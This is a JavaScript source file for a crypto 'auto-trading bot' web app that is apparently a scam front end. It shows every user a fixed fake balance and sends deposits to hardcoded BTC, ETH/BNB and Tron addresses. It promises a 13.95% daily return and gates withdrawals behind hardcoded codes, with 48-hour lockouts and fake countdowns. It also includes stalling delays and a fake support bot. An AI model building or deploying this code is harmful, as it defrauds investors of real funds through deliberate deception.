// Blockchain Auto-Trading Bot SPA App Logic
// (c) 2025 web3-provider-apps

// ======= CONSTANTS =======
const TOTAL_BALANCE = 8250.78;
const USDT_DECIMALS = 6;
const walletAccountIDs = [
  "1048291756","9584207136","6732810945","4029158736","8164072395",
  "2057819463","9174623085","3841957260","5297401863","7609284153",
  "4632185097","5827049136","8714956203","6497012835","2396185740",
  "5048731962","7836241905","6104298735","9581726403","7246093815",
  "4308169527","8924056713","5179302468","3589172406","1497825036"
];
const validCodes = ["483921", "175064", "902718", "634285", "217509", "856430", "490127", "731694", "562803", "308417", "941256", "128374", "675820", "203519", "487960", "819432", "356701", "740528", "612947", "098135", "573864", "284691", "160738", "495260", "837514", "021693", "658407", "794135", "320586", "946172"];
let sendAttempts = 0;

// Deposit addresses (per network)
const depositAddresses = {
  "Bitcoin":   { addr: "bc1qv4fffwt8ux3k33n2dms5cdvuh6suc0gtfevxzu", label: "Bitcoin [BTC] Native" },
  "Ethereum":  { addr: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130", label: "Ethereum [ERC-20]" },
  "BNB":       { addr: "0xB36EDa1ffC696FFba07D4Be5cd249FE5E0118130", label: "BNB Smart Chain [BEP20]" },
  "Tron":      { addr: "TSt7yoNwGYRbtMMfkSAHE6dPs1cd9rxcco", label: "Tron [TRC-20]" }
};

// ========== STORAGE KEYS ==========
const LS = {
  user: "autoTrade_user", // {address, accountId, 2fa, ...}
  walletMap: "autoTrade_walletMap", // {address -> accountId}
  transactions: "autoTrade_transactions", // array
  withdraws: "autoTrade_withdrawals", // array
  withdrawSusp: "autoTrade_withdrawSusp", // {accountId: {until: timestamp, count: n}}
  tradePositions: "autoTrade_trades", // array of {asset, start, end, dailyRate, amount, returns}
  notif: "autoTrade_notif", // {enabled: true}
  notifMsgs: "autoTrade_notifMsgs", // [array]
  twofa: "autoTrade_2fa", // {accountId: secret}
  twofaStatus: "autoTrade_2faStatus", // {accountId: true/false}
  theme: "autoTrade_theme"
};

// ========== UTILS ==========
// DOM helpers
function $(sel) { return document.querySelector(sel); }
function $all(sel) { return Array.from(document.querySelectorAll(sel)); }
const sleep = ms => new Promise(r=>setTimeout(r,ms));
function fmtUsd(n) { return typeof n === 'number' ? n.toLocaleString('en-US', {style:'currency',currency:'USD'}) : n; }
function shortAddr(addr) {
  if (!addr || typeof addr !== 'string') return "";
  if (addr.startsWith('0x') && addr.length > 10)
    return addr.slice(0,6) + "..." + addr.slice(-4);
  if (addr.length > 12) return addr.slice(0,5)+"..."+addr.slice(-4);
  return addr;
}
function now() { return Math.floor(Date.now()/1000); }
function saveLS(key, val) { localStorage.setItem(key, JSON.stringify(val)); }
function getLS(key, fallback) { try { return JSON.parse(localStorage.getItem(key)) ?? fallback; } catch { return fallback; } }
function delLS(key) { localStorage.removeItem(key); }
function show(el) { el.classList.remove('hide'); }
function hide(el) { el.classList.add('hide'); }
function copyToClipboard(txt) { navigator.clipboard.writeText(txt); }
function daysBetween(a,b) { return Math.ceil((b-a)/86400); }
function formatCountdown(s) {
  let d = Math.floor(s/86400), h=Math.floor((s%86400)/3600), m=Math.floor((s%3600)/60), sec=(s%60);
  return `${d>0?d+"d ":""}${h}h ${m}m ${sec}s`;
}

// ========== APP STATE ==========
let app = {
  user: null, // {address, accountId, ...}
  walletMap: {}, // {address: accountId}
  transactions: [],
  withdrawals: [],
  withdrawSusp: {},
  tradePositions: [],
  notif: {enabled:false},
  notifMsgs: [],
  twofa: {},
  twofaStatus: {},
  coinCache: [],
  marketTop: [],
  isLoading: false
};
// Load all persistent state
function loadAppState() {
  app.user = getLS(LS.user,null);
  app.walletMap = getLS(LS.walletMap,{});
  app.transactions = getLS(LS.transactions,[]);
  app.withdrawals = getLS(LS.withdraws,[]);
  app.withdrawSusp = getLS(LS.withdrawSusp,{});
  app.tradePositions = getLS(LS.tradePositions,[]);
  app.notif = getLS(LS.notif,{enabled:false});
  app.notifMsgs = getLS(LS.notifMsgs,[]);
  app.twofa = getLS(LS.twofa,{});
  app.twofaStatus = getLS(LS.twofaStatus,{});
  app.theme = getLS(LS.theme,"dark");
}

// ========== PAGE NAV ==========
// Show only one page at a time (SPA)
function switchPage(pageId) {
  $all('.page').forEach(p => p.classList.add('hidden'));
  $('#' + pageId).classList.remove('hidden');
  // lazy load for markets
  if (pageId === 'markets') loadMarkets();
  // charts
  if (pageId === 'home') createTV('tvchart','BINANCE:BTCUSDT');
  if (pageId === 'trade') createTV('tradeChart','BINANCE:BTCUSDT');
  if (pageId === 'futures') createTV('futuresChart','BINANCE:BTCUSDT');
}
// Footer nav
$all('.tab').forEach(t=>t.addEventListener('click',()=>{
  const tgt=t.dataset.target; switchPage(tgt);
  $all('.tab').forEach(x=>x.classList.remove('tab-active','opacity-100'));
  t.classList.add('tab-active');
}));

// ========== MARKETS ==========
async function loadMarkets() {
  try {
    const url = 'https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=50&page=1&sparkline=false&price_change_percentage=24h';
    const res = await fetch(url); const data = await res.json();
    // Fill Top coins & Market list
    app.marketTop = data;
    $('#topCoinsList').innerHTML = data.slice(0,8).map(c=>`
      <div class="flex items-center justify-between py-2">
        <div class="flex items-center gap-3">
          <img src="${c.image}" class="w-6 h-6 rounded" />
          <div class="text-sm">
            <div class="font-medium">${c.name} <span class="text-xs text-gray-400 uppercase">(${c.symbol})</span></div>
            <div class="text-xs text-gray-500">Mkt Cap: ${Math.round(c.market_cap).toLocaleString()}</div>
          </div>
        </div>
        <div class="text-right">
          <div class="font-semibold">${fmtUsd(c.current_price)}</div>
          <div class="text-xs ${c.price_change_percentage_24h >= 0 ? 'text-green-400' : 'text-red-400'}">${(c.price_change_percentage_24h||0).toFixed(2)}%</div>
        </div>
      </div>`).join('');
    $('#marketsList').innerHTML = data.map(c=>`
      <div class="flex items-center justify-between p-2 border-b border-gray-800" data-coin="${c.id}">
        <div class="flex items-center gap-3">
          <img src="${c.image}" class="w-6 h-6 rounded" />
          <div class="text-sm">
            <div class="font-medium">${c.name}</div>
            <div class="text-xs text-gray-400">${c.symbol.toUpperCase()}</div>
          </div>
        </div>
        <div class="text-right">
          <div class="font-semibold">${fmtUsd(c.current_price)}</div>
          <div class="text-xs ${c.price_change_percentage_24h >= 0 ? 'text-green-400' : 'text-red-400'}">${(c.price_change_percentage_24h||0).toFixed(2)}%</div>
        </div>
      </div>`).join('');
    // Gainers & Losers
    const sorted = data.slice().sort((a,b)=>(b.price_change_percentage_24h||0)-(a.price_change_percentage_24h||0));
    $('#gainers').innerHTML = sorted.slice(0,4).map(c=>`
      <div class="flex items-center gap-2"><img src="${c.image}" class="w-5 h-5"/><div class="flex-1">${c.symbol.toUpperCase()} <div class="text-xs text-gray-400">${fmtUsd(c.current_price)}</div></div><div class="text-sm text-green-400">${(c.price_change_percentage_24h||0).toFixed(1)}%</div></div>`).join('');
    $('#losers').innerHTML = sorted.slice(-4).reverse().map(c=>`
      <div class="flex items-center gap-2"><img src="${c.image}" class="w-5 h-5"/><div class="flex-1">${c.symbol.toUpperCase()} <div class="text-xs text-gray-400">${fmtUsd(c.current_price)}</div></div><div class="text-sm text-red-400">${(c.price_change_percentage_24h||0).toFixed(1)}%</div></div>`).join('');
  } catch(e){console.warn('markets failed',e);}
}

// ========== USDT / WALLET ==========
async function loadUsdt() {
  try {
    const res = await fetch('https://api.coingecko.com/api/v3/coins/tether');
    const data = await res.json();
    $('#usdtLogo').src = data.image.thumb;
    const market = await (await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=tether')).json();
    if (market && market[0]) $('#usdtPrice').innerText = fmtUsd(market[0].current_price);
    // Wallet Portfolio
    $('#walletHoldings').innerHTML = `<div class="flex items-center justify-between">
      <div class="flex items-center gap-3">
        <img src="${data.image.thumb}" class="w-6 h-6 rounded" />
        <div>
          <div class="font-medium">Tether USD (USDT)</div>
          <div class="text-xs text-gray-400">Balance</div>
        </div>
      </div>
      <div class="text-right font-semibold">${fmtUsd(TOTAL_BALANCE)}</div>
    </div>`;
  } catch(e){console.warn('usdt failed',e);}
}

// ========== TRADINGVIEW CHARTS ==========
function createTV(containerId, symbol='BINANCE:BTCUSDT') {
  const container = document.getElementById(containerId); if (container) container.innerHTML = '';
  return new window.TradingView.widget({
    container_id: containerId,
    width: '100%',
    height: container?.clientHeight || 320,
    symbol,
    interval: '60',
    timezone: 'Etc/UTC',
    theme: 'dark',
    style: '1',
    locale: 'en',
    toolbar_bg: '#0b0f14',
    enable_publishing: false,
    withdateranges: true,
    allow_symbol_change: true
  });
}
let tvHome = createTV('tvchart', 'BINANCE:BTCUSDT');
let tvTrade = createTV('tradeChart', 'BINANCE:BTCUSDT');
let tvFutures = createTV('futuresChart', 'BINANCE:BTCUSDT');
$('#loadSymbol').addEventListener('click', ()=> {
  const sym = $('#tradeSymbol').value;
  tvTrade = createTV('tradeChart', sym);
});

// ========== INITIAL LOAD ==========
(async function init(){
  loadAppState();
  // Set wallet/account info if logged in
  if (app.user?.accountId) {
    $('#walletId').innerText = app.user.accountId;
    $('#walletId2').innerText = app.user.accountId;
  }
  $('#totalBalance').innerText = fmtUsd(TOTAL_BALANCE);
  $('#totalBalance2').innerText = fmtUsd(TOTAL_BALANCE);
  await loadUsdt();
  await loadMarkets();
  setInterval(loadMarkets, 60000);
  setInterval(loadUsdt, 60000);
  // Handle notification popups
  handleMarketNotif();
  // Show landing or home
  if (app.user?.accountId) switchPage('home');
  else switchPage('landingPage');
})();

// ========== INSTALL PROMPT ==========
document.getElementById('getMobileAppBtn').onclick = function() {
  show($('#installPrompt'));
};
$('#installNowBtn').onclick = function() { /* PWA logic handled in index.html */ hide($('#installPrompt')); };
$('#maybeLaterBtn').onclick = function() { hide($('#installPrompt')); };

// ========== MORE MENU ==========
$('#moreBtn').addEventListener('click', ()=> $('#moreMenu').classList.toggle('hidden'));
document.addEventListener('click', (e)=> {
  if (!e.target.closest('#moreBtn') && !e.target.closest('#moreMenu')) $('#moreMenu').classList.add('hidden');
});

// ========== NOTIFICATIONS ==========
function handleMarketNotif() {
  // If enabled, fetch CoinGecko news every 12h and show popup
  if (app.notif.enabled) {
    // Show popup if new
    let lastPop = getLS("autoTrade_lastNotif",0);
    if (now()-lastPop > 43200) { // 12h
      fetch('https://api.coingecko.com/api/v3/status_updates?project_type=coin&per_page=1&page=1')
      .then(r=>r.json()).then(res=>{
        if (res?.status_updates?.length) {
          let news = res.status_updates[0].description;
          $('#homeMarketNotif').innerText = news;
          show($('#homeMarketNotif'));
          setTimeout(()=>hide($('#homeMarketNotif')),9000);
          localStorage.setItem("autoTrade_lastNotif",now());
        }
      });
    }
  }
}

// ========== WALLET CONNECT ==========
let currentProvider = null, connectedAddr = null;
$('#connectWalletBtn').onclick = async function() {
  show($('#walletModal'));
};
$('#closeWalletModal').onclick = function() { hide($('#walletModal')); };
$('#connectMetaMask').onclick = async function() {
  hide($('#walletModal'));
  if (window.ethereum) {
    try {
      const [addr] = await window.ethereum.request({method:"eth_requestAccounts"});
      connectedAddr = addr;
      onWalletConnected(addr);
    } catch(e){alert("MetaMask error: "+e.message);}
  } else alert("MetaMask not detected.");
};
$('#connectWalletConnect').onclick = async function() {
  hide($('#walletModal'));
  // Simulate, as full WalletConnect logic is lengthy
  let addr = prompt("Enter your Ethereum address (WalletConnect simulation):");
  if (addr && addr.length > 5) onWalletConnected(addr);
};
$('#connectTron').onclick = async function() {
  hide($('#walletModal'));
  if (window.tronWeb && window.tronWeb.defaultAddress?.base58) {
    connectedAddr = window.tronWeb.defaultAddress.base58;
    onWalletConnected(connectedAddr);
  } else alert("TronLink not detected.");
};
$('#manualAddress').onclick = function() {
  show($('#manualAddressInput'));
};
$('#manualConfirm').onclick = function() {
  let v = $('#manualInput').value.trim();
  if (v && v.length > 5) { hide($('#walletModal')); onWalletConnected(v); }
  else alert("Invalid address.");
};
function onWalletConnected(addr) {
  // Assign accountId if needed
  let map = getLS(LS.walletMap,{});
  let accId = map[addr];
  if (!accId) {
    // assign unused
    let used = Object.values(map);
    accId = walletAccountIDs.find(id=>!used.includes(id));
    if (!accId) accId = String(Math.floor(1000000000+Math.random()*9000000000));
    map[addr] = accId;
    saveLS(LS.walletMap,map);
  }
  app.user = {address: addr, accountId: accId};
  saveLS(LS.user, app.user);
  $('#walletId').innerText = accId;
  $('#walletId2').innerText = accId;
  $('#totalBalance').innerText = fmtUsd(TOTAL_BALANCE);
  $('#totalBalance2').innerText = fmtUsd(TOTAL_BALANCE);
  show($('#saveAccPopup'));
  switchPage('home');
}

// ========== LOGIN ID PAGE ==========
$('#loginIdBtn').onclick = function() {
  $('#loginInput').value = '';
  $('#loginMsg').innerText = '';
  show($('#loginModal'));
};
$('#loginConfirm').onclick = async function() {
  let v = $('#loginInput').value.trim();
  if (!v.match(/^\d{10}$/)) { $('#loginMsg').innerText = "Enter a valid 10-digit Account ID."; return; }
  $('#loginMsg').innerText = "Logging in...";
  await sleep(15000);
  // Check mapping
  let wmap = getLS(LS.walletMap,{});
  let found = Object.entries(wmap).find(([a,id])=>id===v);
  if (found) {
    app.user = {address: found[0], accountId: v};
    saveLS(LS.user, app.user);
    $('#walletId').innerText = v;
    $('#walletId2').innerText = v;
    $('#loginMsg').innerText = "Success!";
    hide($('#loginModal'));
    switchPage('home');
  } else {
    $('#loginMsg').innerText = "Connect wallet to get a wallet id.";
  }
};
$('#loginModal').addEventListener('click',e=>{
  if(e.target===e.currentTarget)hide($('#loginModal'));
});

// ========== SAVE ACCOUNT POPUP ==========
$('#showAccountBtn').onclick = function() {
  // Fill account modal
  $('#accModalAddr').innerText = app.user?.address||"";
  $('#accModalID').innerText = app.user?.accountId||"";
  $('#accModalBal').innerText = fmtUsd(TOTAL_BALANCE);
  hide($('#saveAccPopup')); show($('#accountModal'));
};
$('#closeSaveAccPopup').onclick = function() { hide($('#saveAccPopup')); };

// ========== ACCOUNT MODAL ==========
$('#closeAccModal').onclick = function() { hide($('#accountModal')); };
$('#secureAccBtn').onclick = function() { hide($('#accountModal')); showGoogleAuth(); };

// ========== GOOGLE AUTH (2FA) ==========
function showGoogleAuth() {
  const accId = app.user?.accountId;
  if (!accId) return;
  // Generate secret if not exist
  let secret = app.twofa[accId] || window.otplib.authenticator.generateSecret();
  app.twofa[accId] = secret;
  saveLS(LS.twofa, app.twofa);
  // QR code
  const uri = window.otplib.authenticator.keyuri(accId, "AutoTradeBot", secret);
  $('#authAccID').innerText = accId;
  $('#gaSecret').innerText = secret;
  var qr = new QRious({element:$('#gaQR'), value:uri, size:120, background:"#fff", foreground:"#000"});
  $('#gaCode').value = ""; $('#gaMsg').innerText = "";
  show($('#authModal'));
}
$('#gaVerifyBtn').onclick = async function() {
  let code = $('#gaCode').value.trim();
  let accId = app.user?.accountId, secret = app.twofa[accId];
  $('#gaMsg').innerText = "Verifying...";
  await sleep(15000);
  if (window.otplib.authenticator.check(code,secret)) {
    app.twofaStatus[accId] = true;
    saveLS(LS.twofaStatus, app.twofaStatus);
    $('#gaMsg').innerText = "2FA enabled!";
  } else {
    $('#gaMsg').innerText = "Invalid code. Try again.";
  }
};
$('#gaCloseBtn').onclick = function() { hide($('#authModal')); };

// ========== DEPOSIT ==========
$('#depositBtn').onclick = async function() {
  $('#depositSearch').value = "";
  // Load coins
  if (!app.coinCache.length) {
    let coins = await fetch('https://api.coingecko.com/api/v3/coins/list').then(r=>r.json());
    let mkts = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=250&page=1').then(r=>r.json());
    app.coinCache = mkts.map(c=>({id:c.id,name:c.name,symbol:c.symbol,thumb:c.image}));
  }
  $('#depositCoinList').innerHTML = app.coinCache.slice(0,15).map(c=>`
    <div class="flex items-center gap-3 p-2 cursor-pointer coin-row" data-id="${c.id}">
      <img src="${c.thumb}" class="w-6 h-6 rounded" /><span>${c.name} (${c.symbol.toUpperCase()})</span>
    </div>`).join('');
  show($('#depositModal'));
};
$('#closeDepositModal').onclick = function() { hide($('#depositModal')); };
$('#depositSearch').oninput = function() {
  let q=this.value.trim().toLowerCase();
  let coins=app.coinCache.filter(c=>c.name.toLowerCase().includes(q)||c.symbol.includes(q));
  $('#depositCoinList').innerHTML = coins.slice(0,25).map(c=>`
    <div class="flex items-center gap-3 p-2 cursor-pointer coin-row" data-id="${c.id}">
      <img src="${c.thumb}" class="w-6 h-6 rounded" /><span>${c.name} (${c.symbol.toUpperCase()})</span>
    </div>`).join('');
};
// Coin click: show network modal
$('#depositCoinList').onclick = function(e) {
  let row = e.target.closest('.coin-row'); if (!row) return;
  $('#depositModal').classList.add('hide');
  // Show network selection
  $('#depositNetList').innerHTML = Object.keys(depositAddresses).map(net=>`
    <button class="btn btn-secondary w-full my-2 deposit-net-btn" data-net="${net}">${depositAddresses[net].label}</button>
  `).join('');
  show($('#depositNetworkModal'));
};
$('#closeDepositNetModal').onclick = function() { hide($('#depositNetworkModal')); };
// Network select: show address/qr
$('#depositNetList').onclick = function(e) {
  let btn = e.target.closest('.deposit-net-btn');
  if (!btn) return;
  let net = btn.dataset.net;
  let addr = depositAddresses[net].addr;
  $('#depNetLabel').innerText = depositAddresses[net].label;
  $('#depAddrLabel').innerText = addr;
  // QR
  new QRious({element:$('#depQrCanvas'), value:addr, size:120, background:"#fff", foreground:"#000"});
  show($('#depositAddressModal'));
};
$('#copyDepAddr').onclick = function() {
  copyToClipboard($('#depAddrLabel').innerText);
  alert("Address copied!");
};
$('#closeDepositAddrModal').onclick = function() { hide($('#depositAddressModal')); };

// ========== WITHDRAW ==========
$('#withdrawBtn').onclick = function() { show($('#withdrawSheet')); };
$('#closeWithdrawSheet').onclick = function() { hide($('#withdrawSheet')); };
$('#onChainTransferBtn').onclick = function() {
  hide($('#withdrawSheet'));
  $('#wdAddr').value = '';
  $('#wdAmt').value = '';
  $('#wdDetailMsg').innerText = "";
  $('#wdNetwork').value = "Ethereum";
  show($('#withdrawDetailModal'));
};
$('#fillFromWallet').onclick = function() {
  $('#wdAddr').value = app.user?.address || "";
};
$('#wdMaxBtn').onclick = function() {
  $('#wdAmt').value = TOTAL_BALANCE;
};
$('#closeWithdrawDetail').onclick = function() { hide($('#withdrawDetailModal')); };
$('#wdSubmitBtn').onclick = function() {
  let addr = $('#wdAddr').value.trim();
  let amt = parseFloat($('#wdAmt').value);
  if (!addr || isNaN(amt) || amt<=0) { $('#wdDetailMsg').innerText="Enter valid address and amount"; return; }
  hide($('#withdrawDetailModal'));
  $('#wdCodeInput').value = ""; $('#wdCodeMsg').innerText="";
  show($('#withdrawCodeModal'));
};
$('#closeWithdrawCode').onclick = function() { hide($('#withdrawCodeModal')); };

$('#wdCodeSubmit').onclick = async function() {
  let code = $('#wdCodeInput').value.trim();
  let addr = $('#wdAddr').value.trim(), amt = parseFloat($('#wdAmt').value), net = $('#wdNetwork').value;
  $('#wdCodeMsg').innerText = "Processing...";
  await sleep(15000);

  // 48h suspension check
  let susp = getLS(LS.withdrawSusp, {})[app.user.accountId];
  if (susp && now() < susp.until) {
    $('#wdCodeMsg').innerText = `Withdrawals suspended for ${formatCountdown(susp.until-now())}`;
    return;
  }
  if (validCodes.includes(code)) {
    // Start withdrawal with 24hr countdown, persist
    let wd = {
      address: addr, amount: amt, network: net,
      start: now(), end: now()+86400, status: "processing",
      userId: app.user.accountId
    };
    let withdrawals = getLS(LS.withdraws, []);
    withdrawals.push(wd);
    saveLS(LS.withdraws, withdrawals);

    // Add to activity/transactions
    let txs = getLS(LS.transactions, []);
    txs.push({type:'withdraw', ...wd});
    saveLS(LS.transactions, txs);

    hide($('#withdrawCodeModal'));
    showWithdrawProcessing(wd);
    renderOngoingWithdrawals();
  } else {
    sendAttempts++;
    if (sendAttempts >= 5) {
      let suspObj = getLS(LS.withdrawSusp, {});
      suspObj[app.user.accountId] = {until: now()+172800, count: sendAttempts};
      saveLS(LS.withdrawSusp, suspObj);
      $('#wdCodeMsg').innerText = "Withdrawal suspended for 48 hours.";
    } else {
      $('#wdCodeMsg').innerText = "Validation failed please enter correct code";
    }
  }
};

// Show withdrawal processing modal, persistent/refresh-safe
function showWithdrawProcessing(wd) {
  $('#wpAddr').innerText = wd.address;
  $('#wpNetwork').innerText = wd.network;
  $('#wpAmt').innerText = fmtUsd(wd.amount);

  // Countdown update logic
  function update() {
    let cd = wd.end - now();
    $('#wpCountdown').innerText = formatCountdown(cd>0?cd:0);
    if (cd <= 0) {
      clearInterval(timer);
      // Complete withdrawal, deduct, mark as successful
      let withdrawals = getLS(LS.withdraws, []);
      withdrawals = withdrawals.map(w=>{
        if (w.start === wd.start && w.userId === wd.userId && w.address === wd.address) {
          w.status = "completed";
          w.completedAt = now();
        }
        return w;
      });
      saveLS(LS.withdraws, withdrawals);

      // Simulate: set USDT balance to 0.0680
      $('#usdtPrice').innerText = fmtUsd(0.0680);

      // Show success popup
      $('#wsDetails').innerHTML = `
        <div>Address: ${wd.address}</div>
        <div>Amount: ${fmtUsd(wd.amount)}</div>
        <div>Network: ${wd.network}</div>
      `;
      show($('#withdrawSuccessModal'));
      renderOngoingWithdrawals();
    }
  }
  show($('#withdrawProcessModal'));
  update();
  let timer = setInterval(update, 1000);

  $('#wpCloseBtn').onclick = function() {
    hide($('#withdrawProcessModal'));
    clearInterval(timer);
  };
  $('#wpViewDetails').onclick = function() {
    // Redirect to home, scroll to transactions, show ongoing
    switchPage('home');
    hide($('#withdrawProcessModal'));
    setTimeout(renderOngoingWithdrawals, 100);
  };
}

// Withdraw success modal close/cancel
$('#wsCloseBtn').onclick = function() {
  hide($('#withdrawSuccessModal'));
  renderOngoingWithdrawals();
};

// Keep countdown running and activity visible after refresh
function renderOngoingWithdrawals() {
  const ongoing = (getLS(LS.withdraws, []) || []).filter(wd => wd.status === "processing" && now() < wd.end);
  let list = ongoing.map(wd => {
    const left = wd.end-now();
    return `
      <div class="bg-gray-800 rounded p-2 mb-2">
        <div><b>Processing Withdrawal</b></div>
        <div>Address: <span>${wd.address}</span></div>
        <div>Network: <span>${wd.network}</span></div>
        <div>Amount: <span>${fmtUsd(wd.amount)}</span></div>
        <div>Time Remaining: <span class="countdown" data-end="${wd.end}">${formatCountdown(left)}</span></div>
      </div>
    `;
  }).join('');
  $('#recentTx').innerHTML = list || '<div class="text-gray-400">No transactions — demo mode.</div>';
}
function updateCountdownDisplays() {
  $all('.countdown').forEach(el=>{
    const end = parseInt(el.dataset.end,10);
    const left = end-now();
    el.innerText = formatCountdown(left>0?left:0);
  });
}
function restoreWithdrawalsUI() {
  let withdrawals = getLS(LS.withdraws, []);
  withdrawals.filter(wd=>wd.status==="processing" && now()<wd.end)
    .forEach(wd => showWithdrawProcessing(wd));
  renderOngoingWithdrawals();
}
window.addEventListener('DOMContentLoaded', restoreWithdrawalsUI);
setInterval(() => {
  updateCountdownDisplays();
  renderOngoingWithdrawals();
}, 1000);

// ========== SWAP (DEMO) ==========
$('#swapBtn').onclick = ()=>alert("Swap flow (demo)");

// ========== TRADE PAGE ==========
$('#placeOrderBtn').onclick = function() {
  show($('#tradeModal'));
};
$('#closeTradeModal').onclick = function() { hide($('#tradeModal')); };
$('#placeTradeBtn').onclick = function() {
  // Choose asset
  $('#tradeAssetList').innerHTML = app.marketTop.slice(0,10).map(c=>`
    <div class="flex items-center gap-2 p-2 cursor-pointer trade-asset-row" data-symbol="${c.symbol.toUpperCase()}"><img src="${c.image}" class="w-5 h-5"/>${c.name}</div>
  `).join('');
  show($('#tradeAssetModal'));
};
$('#closeTradeAssetModal').onclick = function() { hide($('#tradeAssetModal')); };
// Asset select
$('#tradeAssetList').onclick = function(e) {
  let row = e.target.closest('.trade-asset-row');
  if (!row) return;
  let asset = row.dataset.symbol;
  $('#tradeOrderAsset').innerText = "Asset: "+asset;
  $('#tradeDurSelect').value = "";
  show($('#tradeDurModal'));
};
$('#tradeDurConfirm').onclick = function() {
  let dur = $('#tradeDurSelect').value;
  if (!dur) return;
  $('#tradeOrderDur').innerText = "Duration: "+dur+" months";
  show($('#tradePlaceOrderModal'));
};
$('#tradeOrderBtn').onclick = async function() {
  // Simulate trade activation
  await sleep(15000);
  let pos = {asset: $('#tradeOrderAsset').innerText.replace("Asset: ",""), start: now(), end: now()+parseInt($('#tradeDurSelect').value)*2592000, dailyRate: 0.1395, amount: 1000, returns: 0};
  app.tradePositions.push(pos); saveLS(LS.tradePositions, app.tradePositions);
  hide($('#tradePlaceOrderModal'));
  alert("Trade activated!");
};
$('#tradeTransferBtn').onclick = function() { show($('#tradeTransferModal')); };
$('#closeTransferModal').onclick = function() { hide($('#tradeTransferModal')); };
$('#transferBtn').onclick = async function() {
  await sleep(15000);
  alert("Transfer processed!");
  hide($('#tradeTransferModal'));
};
$('#viewEarningsBtn').onclick = function() { show($('#tradeEarningsModal')); };
$('#closeTradeEarningsModal').onclick = function() { hide($('#tradeEarningsModal')); };

// ========== SETTINGS ==========
$('#settingsBtn').onclick = function() { switchPage('settingsPage'); };
$('#closeAccountBtn').onclick = async function() {
  // 2FA required
  if (!app.twofaStatus[app.user.accountId]) { alert("Enable 2FA first."); return; }
  alert("Deactivating..."); await sleep(15000);
  // Remove user from walletMap
  let map = getLS(LS.walletMap,{}); delete map[app.user.address];
  saveLS(LS.walletMap, map);
  delLS(LS.user); app.user=null;
  switchPage('landingPage');
};
// Theme
$('#themeSelect').onchange = function() {
  app.theme = this.value; saveLS(LS.theme, app.theme);
  document.body.className = app.theme==="light"?"bg-white text-black":"bg-black text-white";
};

// ========== SUPPORT ==========
$('#supportBtn').onclick = function() { switchPage('supportPage'); };
$('#supportSendBtn').onclick = function() {
  let msg = $('#supportUserMsg').value.trim();
  if (!msg) return;
  let box = $('#supportChatBox');
  box.innerHTML += `<div class="mb-2"><b>You:</b> ${msg}</div>`;
  $('#supportUserMsg').value = "";
  // Simulated AI bot
  setTimeout(()=>{box.innerHTML += `<div class="mb-2 text-yellow-400"><b>Bot:</b> Thank you for your message. Our AI assistant will reply soon. For now, check FAQs above.</div>`;box.scrollTop=box.scrollHeight;},1000);
};

// ========== NOTIFICATIONS ==========
$('#notifBtn').onclick = function() { switchPage('notifPage'); };
$('#notifToggle').onchange = function() {
  app.notif.enabled = this.checked; saveLS(LS.notif, app.notif);
  $('#notifToggleLabel').innerText = this.checked?"On":"Off";
};
$('#notifPageToggle').onchange = function() {
  app.notif.enabled = this.checked; saveLS(LS.notif, app.notif);
  $('#notifPageToggleLabel').innerText = this.checked?"On":"Off";
};
$('#notifList').innerText = app.notifMsgs.slice(-10).map(msg=>"<div>"+msg+"</div>").join("");

// ========== TRANSACTIONS / ACTIVITY ==========
$('#transactionsBtn').onclick = function() {
  alert("Show transactions (demo). List: "+JSON.stringify(app.transactions));
};
$('#activityBtn').onclick = function() {
  alert("Show activity (demo). List: "+JSON.stringify(app.transactions));
};
$('#disconnectBtn').onclick = async function() {
  alert("Disconnecting...");
  await sleep(15000);
  delLS(LS.user); app.user=null; switchPage('landingPage');
};
// END
